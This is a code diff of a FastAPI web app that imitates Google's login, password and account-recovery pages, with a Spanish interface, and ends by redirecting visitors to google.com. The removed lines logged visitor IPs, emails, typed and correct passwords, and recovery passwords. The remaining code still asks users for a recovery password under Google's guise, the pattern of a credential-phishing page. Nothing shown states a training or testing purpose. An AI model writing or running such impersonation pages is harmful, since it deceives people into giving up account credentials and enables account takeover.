@@ -2,7 +2,6 @@ from fastapi import FastAPI, Request, Form
 from fastapi.responses import HTMLResponse, RedirectResponse
 from fastapi.templating import Jinja2Templates
 import logging
-from datetime import datetime
 import uvicorn
 
 logging.basicConfig(level=logging.INFO)
@@ -23,11 +22,6 @@ async def google_login(request: Request):
 
 @app.post("/check-email")
 async def check_email(request: Request, email: str = Form(...)):
-    client_host = request.client.host if request.client else "N/A"
-    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    logger.info(f"[EMAIL_ATTEMPT] IP: {client_host}, Email: '{email}'")
-    
     if email not in VALID_ACCOUNTS:
         return templates.TemplateResponse("google_login.html", {
             "request": request,
@@ -57,10 +51,7 @@ async def password_page(request: Request):
 
 @app.post("/check-password")
 async def check_password(request: Request, password: str = Form(...)):
-    client_host = request.client.host if request.client else "N/A"
     email = request.cookies.get("user_email", "")
-    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
     if not email or email not in VALID_ACCOUNTS:
         return RedirectResponse(url="/", status_code=303)
     
@@ -71,8 +62,6 @@ async def check_password(request: Request, password: str = Form(...)):
         colors = ["#4285F4", "#34A853", "#FBBC05", "#EA4335"]
         color_index = ord(first_letter) % len(colors)
         
-        logger.info(f"[WRONG_PASSWORD] IP: {client_host}, Email: '{email}', Provided: '{password}', Correct: '{correct_password}'")
-        
         return templates.TemplateResponse("password_step.html", {
             "request": request,
             "email": email,
@@ -81,7 +70,6 @@ async def check_password(request: Request, password: str = Form(...)):
             "error_message": "Contraseña incorrecta. Vuelve a intentarlo."
         })
     
-    logger.info(f"[CORRECT_PASSWORD] IP: {client_host}, Email: '{email}'")
     return RedirectResponse(url="/recovery", status_code=303)
 
 @app.get("/recovery", response_class=HTMLResponse)
@@ -90,19 +78,10 @@ async def recovery_page(request: Request):
     if not email or email not in VALID_ACCOUNTS:
         return RedirectResponse(url="/", status_code=303)
     
-    return templates.TemplateResponse("recovery_step.html", {
-        "request": request,
-        "email": email
-    })
+    return templates.TemplateResponse("recovery_step.html", {"request": request})
 
 @app.post("/process-recovery")
 async def process_recovery(request: Request, recovery_email: str = Form(...), recovery_password: str = Form(...)):
-    client_host = request.client.host if request.client else "N/A"
-    email = request.cookies.get("user_email", "")
-    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    logger.info(f"[RECOVERY_DATA] IP: {client_host}, Main: '{email}', Recovery Email: '{recovery_email}', Recovery Password: '{recovery_password}'")
-    
     response = RedirectResponse(url="https://www.google.com", status_code=307)
     response.delete_cookie(key="user_email")
     return response
